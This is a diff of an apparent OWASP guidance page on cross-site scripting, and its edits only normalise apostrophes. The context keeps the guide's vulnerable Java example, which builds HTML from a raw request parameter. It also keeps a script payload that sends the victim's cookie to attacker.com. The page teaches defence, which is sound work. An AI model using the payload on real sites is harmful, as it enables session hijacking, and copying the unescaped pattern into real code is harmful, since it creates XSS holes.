@@ -12,7 +12,7 @@
 
 ## Am I vulnerable to attack?
 
-You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output, and you don’t use context-sensitive escaping to ensure it cannot run. If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.
+You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output, and you don't use context-sensitive escaping to ensure it cannot run. If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.
 
 Automated tools can find some XSS problems automatically. 
 However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies. 
@@ -35,11 +35,11 @@ The application uses untrusted data in the construction of the following HTML sn
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 
-The attacker manipulates the ‘CC’ parameter in his browser to:
+The attacker manipulates the ‘CC' parameter in his browser to:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. 
+This attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session. 
 Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See 2017-A8 for information on CSRF.
 
 ## References
